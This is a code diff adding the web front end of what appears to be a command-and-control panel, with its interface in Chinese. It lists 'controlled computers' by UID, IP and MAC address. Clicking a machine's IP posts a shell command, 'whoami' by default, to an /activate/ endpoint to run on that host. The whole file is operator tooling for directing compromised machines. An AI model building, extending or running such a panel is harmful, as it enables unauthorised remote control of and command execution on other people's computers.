@@ -1,0 +1,124 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>首页</title>
+    <style>
+        /* CSS 样式 */
+        table {
+            width: 80%;
+            border-collapse: collapse;
+            margin: 20px auto; /* 居中 */
+        }
+        th, td {
+            border: 1px solid #dddddd;
+            text-align: left;
+            padding: 8px;
+        }
+        th {
+            background-color: #f2f2f2;
+        }
+        .container {
+            width: 80%;
+            margin: 20px auto;
+        }
+        .ip-link {
+            color: blue; /* 蓝色 */
+            text-decoration: underline; /* 下划线 */
+            cursor: pointer; /* 光标指示 */
+        }
+        /* 新增样式 */
+        #logout-btn {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            background-color: #f44336; /* 红色 */
+            color: white; /* 白色 */
+            border: none;
+            border-radius: 5px;
+            padding: 10px 20px;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2>已控制计算机</h2>
+        <table id="pcinfo-table">
+            <thead>
+                <tr>
+                    <th>UID</th>
+                    <th>IP</th>
+                    <th>MAC</th>
+                </tr>
+            </thead>
+            <tbody id="pcinfo-body">
+                <!-- 数据将由 JavaScript 动态插入 -->
+            </tbody>
+        </table>
+    </div>
+
+    <!-- 退出登录按钮 -->
+    <button id="logout-btn">退出登录</button>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            fetch('/pcinfo')
+                .then(response => response.json())
+                .then(data => {
+                    const tableBody = document.getElementById('pcinfo-body');
+                    data.forEach(item => {
+                        const row = document.createElement('tr');
+
+                        const uidCell = document.createElement('td');
+                        uidCell.textContent = item.UID;
+                        row.appendChild(uidCell);
+
+                        const ipCell = document.createElement('td');
+                        const ipLink = document.createElement('a');
+                        ipLink.classList.add('ip-link'); // 添加样式类
+                        ipLink.href = '#'; // 链接为空，不进行跳转
+                        ipLink.textContent = item.IP;
+                        ipLink.addEventListener('click', function() {
+                            activate(item.IP); // 点击链接时触发 activate 函数
+                        });
+                        ipCell.appendChild(ipLink);
+                        row.appendChild(ipCell);
+
+                        const macCell = document.createElement('td');
+                        macCell.textContent = item.MAC;
+                        row.appendChild(macCell);
+
+                        tableBody.appendChild(row);
+                    });
+                })
+                .catch(error => console.error('Error fetching pcinfo:', error));
+
+            function activate(ip) {
+                const command = 'whoami'; // 默认命令为 "whoami"
+                const form = document.createElement('form');
+                form.method = 'post';
+                form.action = '/activate/';
+                const inputIP = document.createElement('input');
+                inputIP.type = 'hidden';
+                inputIP.name = 'ip';
+                inputIP.value = ip;
+                const inputCommand = document.createElement('input');
+                inputCommand.type = 'hidden';
+                inputCommand.name = 'command';
+                inputCommand.value = command;
+                form.appendChild(inputIP);
+                form.appendChild(inputCommand);
+                document.body.appendChild(form);
+                form.submit();
+            }
+
+            // 添加退出登录按钮的事件监听器
+            document.getElementById('logout-btn').addEventListener('click', function() {
+                window.location.href = '/logout'; // 点击按钮时执行退出登录操作
+            });
+        });
+    </script>
+</body>
+</html>
